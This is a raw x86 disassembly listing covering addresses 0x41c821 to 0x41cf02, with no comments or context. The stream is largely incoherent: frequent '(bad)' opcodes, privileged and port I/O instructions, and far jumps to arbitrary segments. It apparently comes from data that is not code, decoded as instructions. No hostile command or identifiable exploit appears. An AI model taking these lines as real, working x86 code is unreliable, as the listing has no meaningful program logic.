  41c821:	fbld   TBYTE PTR [edi]
  41c823:	or     BYTE PTR [ecx-0x3c881e7],bl
  41c829:	into   
  41c82a:	outs   dx,DWORD PTR ds:[esi]
  41c82b:	es jb  0x41c7cc
  41c82e:	js     0x41c7cf
  41c830:	(bad)  
  41c831:	out    dx,eax
  41c832:	lock mov esi,DWORD PTR [ebx]
  41c835:	adc    DWORD PTR [ecx+ebx*2],esp
  41c838:	dec    edx
  41c839:	xchg   DWORD PTR [ebx],esi
  41c83b:	out    0x80,eax
  41c83d:	dec    ebx
  41c83e:	jp     0x41c7fa
  41c840:	retf   
  41c841:	jp     0x41c86b
  41c843:	dec    ebp
  41c844:	xlat   BYTE PTR ds:[ebx]
  41c845:	(bad)  
  41c846:	aam    0x93
  41c848:	or     DWORD PTR [ebx-0xc4b4439],ebx
  41c84e:	pop    edi
  41c84f:	fld    st(3)
  41c851:	inc    ecx
  41c852:	xor    al,0xea
  41c854:	ins    DWORD PTR es:[edi],dx
  41c855:	stc    
  41c856:	mov    al,0x9b
  41c858:	or     ah,ah
  41c85a:	xor    DWORD PTR [eax],edx
  41c85c:	cwde   
  41c85d:	cs into 
  41c85f:	mov    ds,WORD PTR [eax]
  41c861:	repnz rol BYTE PTR [eax-0xcefb993],cl
  41c868:	sbb    eax,0x9fa37c1f
  41c86d:	(bad)  [esi]
  41c86f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c870:	pop    eax
  41c871:	dec    ecx
  41c872:	push   edx
  41c873:	xor    al,0x95
  41c875:	in     eax,0x1a
  41c877:	push   esi
  41c878:	xchg   ebx,eax
  41c879:	inc    edi
  41c87a:	push   0x36
  41c87c:	sar    bh,cl
  41c87e:	ds nop
  41c880:	push   0xfffffffb
  41c882:	dec    ebx
  41c883:	lds    eax,FWORD PTR [eax+0x27]
  41c886:	ror    DWORD PTR [edi],1
  41c888:	push   ebp
  41c889:	mov    ebx,0x8e7337ea
  41c88e:	in     eax,dx
  41c88f:	mov    dl,0x96
  41c891:	or     al,0x17
  41c893:	jle    0x41c8fc
  41c895:	pop    ebx
  41c896:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c897:	iret   
  41c898:	sbb    DWORD PTR [eax],0x37c11e9
  41c89e:	add    al,0x2b
  41c8a0:	add    al,0x6f
  41c8a2:	mov    edx,0x3d6218a0
  41c8a7:	cmp    edx,DWORD PTR [ebx-0x38848167]
  41c8ad:	ins    DWORD PTR es:[edi],dx
  41c8ae:	scas   al,BYTE PTR es:[edi]
  41c8af:	xchg   edi,eax
  41c8b0:	leave  
  41c8b1:	push   ebx
  41c8b2:	mov    bl,0x4
  41c8b4:	test   eax,0xa21ff41e
  41c8b9:	mov    dh,0xa
  41c8bb:	push   eax
  41c8bc:	lock mov BYTE PTR [edi],0xea
  41c8c0:	push   cs
  41c8c1:	(bad)  [ebp-0xa]
  41c8c4:	cdq    
  41c8c5:	retf   
  41c8c6:	mov    ah,0xcf
  41c8c8:	dec    ebx
  41c8c9:	push   ecx
  41c8ca:	or     dl,BYTE PTR [ebp-0x1d]
  41c8cd:	addr16 popa 
  41c8cf:	in     al,0xa1
  41c8d1:	jmp    0x8b68:0xbee12951
  41c8d8:	pop    ecx
  41c8d9:	hlt    
  41c8da:	push   esi
  41c8db:	enter  0x1fb4,0x9f
  41c8df:	xor    eax,0x4f92c766
  41c8e4:	xlat   BYTE PTR ds:[ebx]
  41c8e5:	and    BYTE PTR [eax+eax*8],0x4b
  41c8e9:	dec    esp
  41c8ea:	hlt    
  41c8eb:	cld    
  41c8ec:	(bad)  [ebp-0x69]
  41c8ef:	repz sub edx,DWORD PTR ss:[edi]
  41c8f3:	mov    esp,0x14378fc5
  41c8f8:	frstor [ebp+0x12]
  41c8fb:	dec    ebp
  41c8fc:	lds    ebp,FWORD PTR [edi]
  41c8fe:	sbb    ch,dh
  41c900:	adc    ebp,esi
  41c902:	call   0x84377aff
  41c907:	or     edx,DWORD PTR [ecx+0x52140778]
  41c90d:	sub    ah,BYTE PTR [ebp+0x3e]
  41c910:	stos   BYTE PTR es:[edi],al
  41c911:	pop    esp
  41c912:	push   ss
  41c913:	xchg   edi,eax
  41c914:	sbb    BYTE PTR [ebp-0x45552f1c],0xb
  41c91b:	mov    ah,0xa4
  41c91d:	enter  0xc72,0xad
  41c921:	adc    ecx,DWORD PTR [edx]
  41c923:	lahf   
  41c924:	ret    
  41c925:	dec    ebp
  41c926:	stc    
  41c927:	mov    esi,0x6d9de0ed
  41c92c:	aas    
  41c92d:	ror    DWORD PTR gs:[esi],cl
  41c930:	push   0xe86b3dd3
  41c935:	fcomp  DWORD PTR [ebp+0x49]
  41c938:	jcxz   0x41c903
  41c93b:	mov    BYTE PTR [ecx-0x1b],bl
  41c93e:	or     bh,BYTE PTR [edx-0x38029298]
  41c944:	and    al,0x3e
  41c946:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c947:	ror    DWORD PTR [ebx-0x12],1
  41c94a:	sub    eax,0x4ab1c674
  41c94f:	enter  0xba94,0x8c
  41c953:	sub    DWORD PTR [ebx-0x5d8d8a0],ebx
  41c959:	aad    0x1
  41c95b:	in     eax,0x11
  41c95d:	xchg   BYTE PTR [edx],ah
  41c95f:	lahf   
  41c960:	das    
  41c961:	xor    al,0x1a
  41c963:	f2xm1  
  41c965:	aad    0x6b
  41c967:	pop    ebx
  41c968:	pop    edx
  41c969:	nop
  41c96a:	and    DWORD PTR [ebx],esi
  41c96c:	sar    DWORD PTR [ebx+0x53],cl
  41c96f:	xchg   esp,eax
  41c970:	and    dl,BYTE PTR [edx]
  41c972:	call   0xf5e5:0x2dc51d6c
  41c979:	pop    edi
  41c97a:	jmp    0x3b5a:0xf0b2a88a
  41c981:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c982:	hlt    
  41c983:	mov    edi,0x8eb9ec4e
  41c988:	jecxz  0x41c9a2
  41c98a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c98b:	je     0x41c99e
  41c98d:	cld    
  41c98e:	adc    dh,ch
  41c990:	ret    
  41c991:	mov    ds:0x7ee70d00,eax
  41c996:	fistp  QWORD PTR [ebx]
  41c998:	jne    0x41c9c8
  41c99a:	sub    ch,0xbb
  41c99d:	in     al,dx
  41c99e:	ds int 0x98
  41c9a1:	dec    ebp
  41c9a2:	dec    esi
  41c9a3:	call   0x396:0x617935b9
  41c9aa:	fisttp QWORD PTR [edi]
  41c9ac:	popf   
  41c9ad:	ins    DWORD PTR es:[edi],dx
  41c9ae:	hlt    
  41c9af:	push   ss
  41c9b0:	ins    DWORD PTR es:[edi],dx
  41c9b1:	pop    eax
  41c9b2:	(bad)  
  41c9b3:	sub    edx,edi
  41c9b5:	adc    DWORD PTR [esi+0x7a],esp
  41c9b8:	mov    DWORD PTR [edx+0x45b67fb8],esp
  41c9be:	mov    dl,0xb4
  41c9c0:	mov    bh,0x51
  41c9c2:	jbe    0x41c9a7
  41c9c4:	cmp    ebx,esi
  41c9c6:	jmp    0x41ca37
  41c9c8:	ficomp WORD PTR [edx]
  41c9ca:	add    dh,BYTE PTR [esi+ecx*2+0x38a9705e]
  41c9d1:	jecxz  0x41c9cb
  41c9d3:	jg     0x41ca09
  41c9d5:	inc    ecx
  41c9d6:	pop    es
  41c9d7:	xchg   ebp,eax
  41c9d8:	je     0x41c9c7
  41c9da:	inc    edx
  41c9db:	add    BYTE PTR [ebx],dl
  41c9dd:	fcomp  DWORD PTR [eax-0x15]
  41c9e0:	fcom   DWORD PTR [edx]
  41c9e2:	sbb    ecx,DWORD PTR [edx-0x7f10d885]
  41c9e8:	push   ss
  41c9e9:	(bad)  
  41c9eb:	adc    cl,dl
  41c9ed:	test   BYTE PTR [esi+eiz*2],bl
  41c9f0:	mov    ebp,0xb7093f0a
  41c9f5:	rol    BYTE PTR [ecx+0x76ea3fbd],1
  41c9fb:	jno    0x41c991
  41c9fd:	add    cl,BYTE PTR [edi+0x77]
  41ca00:	add    DWORD PTR [esi],ebp
  41ca02:	push   ecx
  41ca03:	inc    esi
  41ca04:	jae    0x41c9fb
  41ca06:	(bad)  
  41ca07:	loopne 0x41c9c2
  41ca09:	int3   
  41ca0a:	mov    bl,0x9f
  41ca0c:	cmp    eax,0x17545198
  41ca11:	mov    al,ds:0xbfddb10c
  41ca16:	mov    eax,0xc10bcce5
  41ca1b:	xor    BYTE PTR [edi],ch
  41ca1d:	outs   dx,BYTE PTR ds:[esi]
  41ca1e:	mov    eax,0x8643312c
  41ca23:	dec    ecx
  41ca24:	out    dx,al
  41ca25:	outs   dx,DWORD PTR ds:[esi]
  41ca26:	push   0xc3e97a5e
  41ca2b:	and    ah,BYTE PTR [ebp-0x3a28b34b]
  41ca31:	add    BYTE PTR [ecx-0x4c],dh
  41ca34:	iret   
  41ca35:	fcmovb st,st(0)
  41ca37:	and    al,0xdf
  41ca39:	mov    DWORD PTR [ebx+0x36],ebx
  41ca3c:	jne    0x41ca48
  41ca3e:	mov    ch,0x2b
  41ca40:	arpl   WORD PTR [edx-0x954bc9a],dx
  41ca46:	loop   0x41ca38
  41ca48:	(bad)  
  41ca49:	push   ebx
  41ca4a:	sub    edi,ebx
  41ca4c:	add    dh,BYTE PTR [edx]
  41ca4e:	in     eax,0x2e
  41ca50:	clc    
  41ca51:	push   ds
  41ca52:	test   eax,0x9c45f8c0
  41ca57:	sti    
  41ca58:	lea    edi,[ecx-0x75]
  41ca5b:	pop    es
  41ca5c:	imul   edi,DWORD PTR [ecx-0x1efd7c3f],0xffffffaf
  41ca63:	sahf   
  41ca64:	int    0x43
  41ca66:	adc    eax,0x4b43d8dd
  41ca6b:	xchg   DWORD PTR [eax+0x28],ebp
  41ca6e:	sti    
  41ca6f:	das    
  41ca70:	fidiv  WORD PTR [ebx+0x0]
  41ca73:	xchg   esp,eax
  41ca74:	aad    0x3b
  41ca76:	pop    edi
  41ca77:	imul   esi,DWORD PTR [eax-0x3f],0xea72493f
  41ca7e:	cmp    dl,BYTE PTR [edi+0x4c]
  41ca81:	test   cl,bh
  41ca83:	jne    0x41ca39
  41ca85:	je     0x41ca98
  41ca87:	push   esi
  41ca88:	fdiv   st(6),st
  41ca8a:	aam    0xd8
  41ca8c:	aam    0xed
  41ca8e:	loope  0x41ca8a
  41ca90:	inc    eax
  41ca91:	push   eax
  41ca92:	push   ecx
  41ca93:	fstp   st(6)
  41ca95:	jp     0x41cab0
  41ca97:	and    ah,al
  41ca99:	sbb    edx,ebp
  41ca9b:	or     dh,ch
  41ca9d:	pop    ecx
  41ca9e:	xor    ch,bl
  41caa0:	pop    eax
  41caa1:	lods   eax,DWORD PTR ds:[esi]
  41caa2:	fdivp  st(3),st
  41caa4:	jg     0x41ca55
  41caa6:	sub    ebp,edx
  41caa8:	sub    DWORD PTR [edi],esi
  41caaa:	imul   esi,ecx,0xfffffff5
  41caad:	aas    
  41caae:	dec    ebx
  41caaf:	xchg   ebx,ebx
  41cab1:	sbb    bh,BYTE PTR [esi+eax*1]
  41cab4:	xchg   ecx,eax
  41cab5:	or     ah,BYTE PTR [ecx+0x5e]
  41cab8:	lock adc DWORD PTR [ecx+ebp*4-0x4c],edi
  41cabd:	das    
  41cabe:	inc    ebx
  41cabf:	pop    edx
  41cac0:	or     esp,eax
  41cac2:	sar    DWORD PTR [esi],1
  41cac4:	xchg   ebp,eax
  41cac5:	jg     0x41caaa
  41cac7:	push   ebp
  41cac9:	ins    DWORD PTR es:[edi],dx
  41caca:	popf   
  41cacb:	mov    gs,ecx
  41cacd:	add    dl,ah
  41cacf:	dec    ebx
  41cad0:	dec    ebp
  41cad1:	ds aam 0xb0
  41cad4:	(bad)  
  41cad5:	pop    esi
  41cad6:	mov    WORD PTR [ecx-0x5e],es
  41cad9:	mov    dh,0xd8
  41cadb:	xor    DWORD PTR [eax],edx
  41cadd:	ins    BYTE PTR es:[edi],dx
  41cade:	inc    cl
  41cae0:	mov    WORD PTR [esi],?
  41cae2:	add    al,0x29
  41cae4:	mov    esi,0xf78edcb9
  41cae9:	sub    BYTE PTR [esi],al
  41caeb:	lods   eax,DWORD PTR ds:[esi]
  41caec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41caed:	loop   0x41cb3d
  41caef:	sysret 
  41caf1:	out    0x2a,eax
  41caf3:	cmc    
  41caf4:	pop    edx
  41caf5:	js     0x41cb69
  41caf7:	outs   dx,BYTE PTR ds:[esi]
  41caf8:	xchg   ebx,eax
  41caf9:	js     0x41cb51
  41cafb:	mov    al,0xdc
  41cafd:	push   ss
  41cafe:	shr    BYTE PTR [edx],0xd4
  41cb01:	ror    ecx,1
  41cb03:	mov    edx,0x98833bed
  41cb08:	mov    WORD PTR [ebp+0x27],cs
  41cb0b:	ins    BYTE PTR es:[edi],dx
  41cb0c:	(bad)  
  41cb0d:	xor    dh,BYTE PTR [edx]
  41cb0f:	push   ecx
  41cb10:	xchg   ecx,eax
  41cb11:	inc    eax
  41cb12:	les    esi,FWORD PTR [ebp-0x341f4641]
  41cb18:	add    dh,BYTE PTR [esi]
  41cb1a:	sub    ebx,ebp
  41cb1c:	push   esi
  41cb1d:	arpl   WORD PTR [ecx-0x5d69e1ad],bx
  41cb23:	xchg   edi,eax
  41cb24:	jle    0x41caa8
  41cb26:	mov    ch,0x67
  41cb28:	dec    esi
  41cb29:	sub    edi,DWORD PTR [edx]
  41cb2b:	mov    esi,0xd1d15fb5
  41cb30:	mov    bh,BYTE PTR [ecx]
  41cb32:	es mov ah,0x4c
  41cb35:	out    dx,al
  41cb36:	fadd   st,st(2)
  41cb38:	std    
  41cb39:	inc    ecx
  41cb3a:	mov    ?,WORD PTR [ebx+0x3bdff6a1]
  41cb40:	xchg   DWORD PTR [ecx],ebx
  41cb42:	ss push ebx
  41cb44:	(bad)  
  41cb45:	xor    al,0x2
  41cb47:	push   0xdb03ebef
  41cb4c:	dec    esi
  41cb4d:	fsubr  st,st(7)
  41cb4f:	cmp    ah,BYTE PTR [eax+0x61b6b200]
  41cb55:	or     esp,eax
  41cb57:	sbb    esp,DWORD PTR [ebx]
  41cb59:	mov    eax,ds:0x51ca99fa
  41cb5e:	push   ebx
  41cb5f:	neg    DWORD PTR [eax]
  41cb61:	push   ds
  41cb62:	sti    
  41cb63:	fstp   DWORD PTR [edx]
  41cb65:	in     al,dx
  41cb66:	or     dl,BYTE PTR [esi+0x3b6e99f7]
  41cb6c:	push   esp
  41cb6d:	and    al,0x91
  41cb6f:	or     esp,esp
  41cb71:	pop    edi
  41cb72:	adc    ch,bl
  41cb74:	call   0x2a6a:0x8ea4bec6
  41cb7b:	add    ch,dl
  41cb7d:	sti    
  41cb7e:	fist   DWORD PTR [esi+eax*8-0x6b]
  41cb82:	ror    al,0xbc
  41cb85:	fiadd  DWORD PTR [esi+0x60a18cc8]
  41cb8b:	cdq    
  41cb8c:	or     eax,0x16463a62
  41cb91:	add    BYTE PTR ds:0x7df97c42,ah
  41cb97:	mov    ebp,0x818ba753
  41cb9c:	or     eax,0x821483d
  41cba1:	pop    edi
  41cba2:	xchg   esi,eax
  41cba3:	jp     0x41cbf9
  41cba5:	cli    
  41cba6:	jg     0x41cb76
  41cba8:	pop    esi
  41cba9:	xlat   BYTE PTR ds:[ebx]
  41cbaa:	jbe    0x41cb35
  41cbac:	jae    0x41cbda
  41cbae:	test   BYTE PTR [ebx+0x6b7a556c],0x46
  41cbb5:	fadd   DWORD PTR [edi+0x1d08d915]
  41cbbb:	mov    esi,0xf65c8414
  41cbc0:	call   0xa342:0x837f4d5e
  41cbc7:	pop    ds
  41cbc8:	mov    eax,0xafc9783f
  41cbcd:	add    eax,0x9881d5b2
  41cbd2:	push   0xdd815f44
  41cbd7:	dec    ebx
  41cbd8:	jnp    0x41cb7e
  41cbda:	inc    ebp
  41cbdb:	sbb    ah,al
  41cbdd:	push   eax
  41cbde:	mov    eax,ds:0xecdeb492
  41cbe3:	ret    
  41cbe4:	out    0x9a,al
  41cbe6:	fs out 0x1a,eax
  41cbe9:	mov    eax,0xcbc85f39
  41cbee:	mov    dl,BYTE PTR [edx]
  41cbf0:	jae    0x41cc07
  41cbf2:	and    ch,BYTE PTR [ecx+0x409964b9]
  41cbf8:	repnz add ah,bh
  41cbfb:	gs dec esi
  41cbfd:	lea    esi,[edx]
  41cbff:	ins    BYTE PTR es:[edi],dx
  41cc00:	jmp    0x41cc5f
  41cc02:	and    al,0xc6
  41cc04:	jle    0x41cc6a
  41cc06:	retf   0x44a2
  41cc09:	fldcw  WORD PTR ds:[ebx]
  41cc0c:	test   DWORD PTR [ecx+0x63],esp
  41cc0f:	ret    0xb801
  41cc12:	repnz aaa 
  41cc14:	push   edx
  41cc15:	cmp    DWORD PTR [edi+ebp*4+0x2468c0e9],edx
  41cc1c:	retf   
  41cc1d:	xor    bh,BYTE PTR [esi]
  41cc1f:	adc    dh,BYTE PTR [edx-0x6cf6b7ae]
  41cc25:	arpl   WORD PTR [edx-0x2c9d0cba],cx
  41cc2b:	aaa    
  41cc2c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cc2d:	mov    DWORD PTR [esi],ebp
  41cc2f:	dec    ecx
  41cc30:	das    
  41cc31:	adc    dh,BYTE PTR [edi]
  41cc33:	cli    
  41cc34:	cmp    DWORD PTR [ebx-0x5e77c9c3],esp
  41cc3a:	and    al,0x90
  41cc3c:	inc    ecx
  41cc3d:	mov    esi,0x72aaf3fd
  41cc42:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  41cc44:	and    al,0x2
  41cc46:	push   cs
  41cc47:	cli    
  41cc48:	inc    ebp
  41cc49:	pop    ebx
  41cc4a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cc4b:	adc    edx,DWORD PTR [esi+esi*1]
  41cc4e:	jae    0x41cca1
  41cc50:	mov    edx,DWORD PTR [ebp+0x28]
  41cc53:	gs pop eax
  41cc55:	inc    edi
  41cc56:	adc    BYTE PTR [edi-0x62371146],al
  41cc5c:	int3   
  41cc5d:	mov    cl,0x82
  41cc5f:	leave  
  41cc60:	scas   al,BYTE PTR es:[edi]
  41cc61:	cdq    
  41cc62:	test   BYTE PTR [ebx],cl
  41cc64:	add    BYTE PTR [esi],bh
  41cc66:	cwde   
  41cc67:	sbb    DWORD PTR [edi+0x4ebfe691],0xffffffc8
  41cc6e:	iret   
  41cc6f:	aas    
  41cc70:	pop    esp
  41cc71:	test   BYTE PTR [edx-0x3c],ch
  41cc74:	div    dh
  41cc76:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cc77:	jecxz  0x41cc31
  41cc79:	mov    edi,0xc7bf0647
  41cc7e:	jo     0x41cc4a
  41cc80:	push   ebp
  41cc81:	mov    cl,0x3f
  41cc83:	dec    DWORD PTR [ebp+esi*8-0x3c]
  41cc87:	sub    BYTE PTR [edi-0x326f5ff6],dh
  41cc8d:	out    0x39,al
  41cc8f:	retf   0x4303
  41cc92:	idiv   esp
  41cc94:	out    0x2e,al
  41cc96:	xchg   esi,eax
  41cc97:	call   DWORD PTR [ecx-0x42]
  41cc9a:	pop    edi
  41cc9b:	xchg   BYTE PTR [ebx],al
  41cc9d:	(bad)  
  41cc9f:	mov    dh,0x1
  41cca1:	cwde   
  41cca2:	or     DWORD PTR [ecx+0x6f],edx
  41cca5:	mov    edx,0xbe8c355
  41ccaa:	leave  
  41ccab:	(bad)  
  41ccac:	lds    esi,FWORD PTR [ecx+0x1dda1109]
  41ccb2:	test   BYTE PTR [edi-0x3e],bh
  41ccb5:	mov    edi,0xf5715380
  41ccba:	cwde   
  41ccbb:	daa    
  41ccbc:	mov    bl,0xfd
  41ccbe:	in     al,0x85
  41ccc0:	jbe    0x41cc84
  41ccc2:	je     0x41ccdf
  41ccc4:	(bad)  
  41ccc5:	mov    ch,0x9f
  41ccc7:	inc    ebp
  41ccc8:	inc    ebp
  41ccc9:	xor    ecx,edx
  41cccb:	mov    ch,bh
  41cccd:	push   ecx
  41ccce:	aaa    
  41cccf:	mov    eax,0xdae8c174
  41ccd4:	push   ebx
  41ccd5:	(bad)  
  41ccd6:	pop    ds
  41ccd7:	jo     0x41ccc0
  41ccd9:	mov    DWORD PTR [ebx+0x2c],eax
  41ccdc:	loop   0x41cd2e
  41ccde:	sbb    ch,dh
  41cce0:	and    BYTE PTR [eax],bl
  41cce2:	in     al,0x95
  41cce4:	ins    BYTE PTR es:[edi],dx
  41cce5:	jo     0x41cd04
  41cce7:	stos   BYTE PTR es:[edi],al
  41cce8:	cdq    
  41cce9:	mov    eax,0xaa30794f
  41ccee:	mov    esi,0x85353914
  41ccf3:	lods   al,BYTE PTR ds:[esi]
  41ccf4:	stos   BYTE PTR es:[edi],al
  41ccf5:	jl     0x41cd03
  41ccf7:	ret    
  41ccf8:	repz (bad) 
  41ccfa:	xlat   BYTE PTR ds:[ebx]
  41ccfb:	ret    
  41ccfc:	push   ds
  41ccfd:	push   edi
  41ccfe:	pop    esp
  41ccff:	inc    esp
  41cd00:	mov    al,ds:0xd2ab8e3e
  41cd05:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cd06:	adc    BYTE PTR [ebx+0x41059b67],ch
  41cd0c:	les    ebp,FWORD PTR [ebx]
  41cd0e:	inc    ecx
  41cd0f:	mov    dl,0xd7
  41cd11:	ss hlt 
  41cd13:	mov    ch,BYTE PTR [esi]
  41cd15:	or     BYTE PTR [edi],bh
  41cd17:	in     eax,0x48
  41cd19:	pop    eax
  41cd1a:	jns    0x41cca0
  41cd1c:	dec    eax
  41cd1d:	ins    BYTE PTR es:[edi],dx
  41cd1e:	mov    ah,0x94
  41cd20:	imul   esi,ecx,0xefd92b23
  41cd26:	sete   BYTE PTR [esi-0x68]
  41cd2a:	hlt    
  41cd2b:	ins    BYTE PTR es:[edi],dx
  41cd2c:	repnz leave 
  41cd2e:	in     al,0xc5
  41cd30:	int3   
  41cd31:	push   ss
  41cd32:	lahf   
  41cd33:	loop   0x41ccd8
  41cd35:	cmp    eax,0x30855c99
  41cd3a:	push   cs
  41cd3b:	ss loope 0x41ccee
  41cd3e:	and    ah,ah
  41cd40:	ficom  DWORD PTR [edx]
  41cd42:	sar    BYTE PTR [edi],0x5c
  41cd45:	ins    BYTE PTR es:[edi],dx
  41cd46:	xchg   DWORD PTR [eax],eax
  41cd48:	mov    dh,0x17
  41cd4a:	(bad)  
  41cd4b:	imul   edi,esi,0x2fc23ecd
  41cd51:	ds enter 0xcd82,0x94
  41cd56:	stc    
  41cd57:	xchg   ebx,eax
  41cd58:	mov    ah,0x28
  41cd5a:	mov    bh,0xa4
  41cd5c:	and    dl,BYTE PTR [esi+0x7c]
  41cd5f:	std    
  41cd60:	xor    edx,eax
  41cd62:	xchg   esi,eax
  41cd63:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cd64:	push   0xffffff84
  41cd66:	(bad)  
  41cd67:	out    0x70,al
  41cd69:	add    DWORD PTR [edx],0xd6e7d129
  41cd6f:	inc    ebx
  41cd70:	cmp    esp,DWORD PTR [esp+ecx*4]
  41cd73:	jmp    ebx
  41cd75:	fisubr DWORD PTR [esi+0x42]
  41cd78:	stc    
  41cd79:	push   esp
  41cd7a:	fs jmp 0x3b39:0x9476caaa
  41cd82:	out    0xc3,eax
  41cd84:	int3   
  41cd85:	sub    al,BYTE PTR [esi]
  41cd87:	inc    ebx
  41cd88:	icebp  
  41cd89:	test   eax,0xdf6c393b
  41cd8e:	retf   
  41cd8f:	mov    eax,0xcdd623a
  41cd94:	mov    dh,0xb7
  41cd96:	stos   DWORD PTR es:[edi],eax
  41cd97:	mov    dh,0xde
  41cd99:	dec    ecx
  41cd9a:	push   esp
  41cd9b:	in     al,0x7b
  41cd9d:	push   0xd7ed2672
  41cda2:	lds    ebx,FWORD PTR [esi+0x3]
  41cda5:	aam    0x71
  41cda7:	pop    ecx
  41cda8:	xchg   esp,eax
  41cda9:	mov    ds,WORD PTR [ecx]
  41cdab:	or     eax,0xc4063191
  41cdb0:	pop    es
  41cdb1:	mov    al,0x86
  41cdb3:	arpl   WORD PTR [ebx-0x7f62ced7],cx
  41cdb9:	out    dx,al
  41cdba:	mov    al,ds:0x476602e9
  41cdbf:	lahf   
  41cdc0:	hlt    
  41cdc1:	mov    edi,0x5f7b512d
  41cdc6:	loop   0x41cdf1
  41cdc8:	push   ss
  41cdc9:	xor    BYTE PTR [ecx],ah
  41cdcb:	jno    0x41cdc0
  41cdcd:	and    ecx,ecx
  41cdcf:	test   bh,bh
  41cdd1:	inc    ecx
  41cdd2:	pop    esp
  41cdd3:	add    bl,0x20
  41cdd6:	addr16 dec ebp
  41cdd8:	mov    WORD PTR [esi+0x42fa76d7],es
  41cdde:	ins    DWORD PTR es:[edi],dx
  41cddf:	lock or esp,DWORD PTR [ecx]
  41cde2:	js     0x41ce39
  41cde4:	(bad)  
  41cde6:	in     eax,dx
  41cde7:	js     0x41ce08
  41cde9:	ret    0xd583
  41cdec:	les    esi,FWORD PTR [edx]
  41cdee:	xor    BYTE PTR [ecx+0x3b],0x4a
  41cdf2:	jae    0x41cdf7
  41cdf4:	lock rcl DWORD PTR [ebp+ebp*4-0x3c],1
  41cdf9:	cmp    ah,BYTE PTR [eax]
  41cdfb:	pop    ebp
  41cdfc:	inc    edx
  41cdfd:	push   ebx
  41cdfe:	sbb    dh,BYTE PTR [edx]
  41ce00:	dec    eax
  41ce01:	pop    esp
  41ce02:	push   es
  41ce03:	inc    edx
  41ce04:	test   eax,0xdc9dee9b
  41ce09:	add    eax,0xa5d9a166
  41ce0e:	dec    esp
  41ce0f:	(bad)  
  41ce10:	rcr    DWORD PTR [ebx-0x75b60a93],1
  41ce16:	xchg   ebx,eax
  41ce17:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ce18:	cmp    DWORD PTR [ecx+ebx*1],ecx
  41ce1b:	xchg   ecx,eax
  41ce1c:	mov    ah,0xdd
  41ce1e:	or     BYTE PTR [edi-0x7b140830],al
  41ce24:	sar    BYTE PTR fs:[ecx+eax*1-0x57],0x1a
  41ce2a:	cmp    ch,cl
  41ce2c:	jns    0x41ce44
  41ce2e:	mov    ds:0x52d130b,al
  41ce33:	(bad)  
  41ce34:	(bad)  
  41ce35:	hlt    
  41ce36:	dec    edx
  41ce37:	mov    edi,DWORD PTR [ecx-0x55]
  41ce3a:	push   ds
  41ce3b:	test   DWORD PTR [edi+0x5290fd93],0x49608821
  41ce45:	or     dl,bl
  41ce47:	push   esi
  41ce48:	(bad)  
  41ce4a:	add    dh,dl
  41ce4c:	mov    edx,0x3c279a59
  41ce51:	outs   dx,DWORD PTR ds:[esi]
  41ce52:	jg     0x41cddb
  41ce54:	xchg   edi,eax
  41ce55:	inc    ecx
  41ce56:	jp     0x41ce39
  41ce58:	or     ah,BYTE PTR [ebx+edx*4+0x7c]
  41ce5c:	mov    ebp,0xf4364eb5
  41ce61:	xchg   esp,eax
  41ce62:	xor    bh,BYTE PTR [edx-0x6e3e58a3]
  41ce68:	jmp    0xa82d0a70
  41ce6d:	mov    ebx,0x2b0b5601
  41ce72:	loop   0x41ce1e
  41ce74:	dec    edi
  41ce75:	inc    esp
  41ce76:	(bad)  
  41ce77:	push   eax
  41ce78:	xchg   BYTE PTR [eax],dh
  41ce7a:	inc    eax
  41ce7b:	dec    esi
  41ce7c:	add    bl,BYTE PTR ds:0xb11ceea5
  41ce82:	jmp    0x41cead
  41ce84:	xlat   BYTE PTR ds:[ebx]
  41ce85:	retf   
  41ce86:	sub    al,0x80
  41ce88:	lods   eax,DWORD PTR ds:[esi]
  41ce89:	cmp    cl,BYTE PTR [eax-0x64]
  41ce8c:	sahf   
  41ce8d:	sub    ecx,DWORD PTR [edx-0x6c]
  41ce90:	xchg   BYTE PTR [edi-0x4cb9c9da],ah
  41ce96:	jo     0x41ce7b
  41ce98:	xchg   esp,eax
  41ce99:	xchg   DWORD PTR [edx+0x79],edx
  41ce9c:	sub    BYTE PTR [eax+eax*8],ah
  41ce9f:	out    dx,eax
  41cea0:	inc    edx
  41cea1:	xchg   DWORD PTR [ebx+0x2a],edi
  41cea4:	stos   BYTE PTR es:[edi],al
  41cea5:	dec    eax
  41cea6:	lock mov BYTE PTR [eax-0x19f02652],ch
  41cead:	sub    eax,0xb95f1772
  41ceb2:	(bad)  
  41ceb3:	mov    dh,0x6
  41ceb5:	popa   
  41ceb6:	jae    0x41cf11
  41ceb8:	rcr    BYTE PTR [edx-0x57],1
  41cebb:	lods   al,BYTE PTR ds:[esi]
  41cebc:	outs   dx,DWORD PTR ds:[esi]
  41cebd:	lods   al,BYTE PTR ds:[esi]
  41cebe:	lds    ebx,FWORD PTR [ebp+0x39]
  41cec1:	sbb    DWORD PTR [edx-0x33],edx
  41cec4:	push   edx
  41cec5:	and    ebx,DWORD PTR [ebp+edx*1-0x7e491537]
  41cecc:	cmp    ah,al
  41cece:	scas   al,BYTE PTR es:[edi]
  41cecf:	sbb    DWORD PTR [esi-0x46ee60de],edx
  41ced5:	dec    ecx
  41ced6:	push   esi
  41ced7:	pop    ds
  41ced8:	push   esi
  41ced9:	cmp    ebx,DWORD PTR [edi-0x6b]
  41cedc:	xor    BYTE PTR [edi],dl
  41cede:	sbb    DWORD PTR [ebx-0x25],edx
  41cee1:	jle    0x41cea2
  41cee3:	lea    ecx,cs:[esi+esi*1+0x48de142c]
  41ceeb:	xor    eax,0xaa8153cb
  41cef0:	jne    0x41cf5a
  41cef2:	ins    BYTE PTR es:[edi],dx
  41cef3:	and    BYTE PTR [eax+0x79cf75dc],dh
  41cef9:	test   al,0x45
  41cefb:	test   cl,bh
  41cefd:	test   eax,0xe0259d03
  41cf02:	jle    0x41cf0e
